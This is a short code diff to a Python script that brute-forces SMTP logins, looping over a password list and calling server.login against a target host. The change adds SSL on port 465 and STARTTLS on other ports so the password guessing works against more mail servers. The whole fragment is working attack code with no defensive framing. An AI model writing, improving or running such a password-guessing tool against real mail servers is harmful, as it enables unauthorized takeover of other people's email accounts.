@@ -4,8 +4,14 @@ import argparse
 def smtp_bruteforce(target, port, username, password_list):
     for password in password_list:
         try:
-            # Attempt to connect to the SMTP server
-            server = smtplib.SMTP(target, port)
+            if port == 465:
+                # Use SSL for port 465
+                server = smtplib.SMTP_SSL(target, port)
+            else:
+                # Use STARTTLS for ports like 587
+                server = smtplib.SMTP(target, port)
+                server.starttls()
+
             server.set_debuglevel(0)
             server.ehlo()  # Start the connection
             server.login(username, password)  # Try logging in
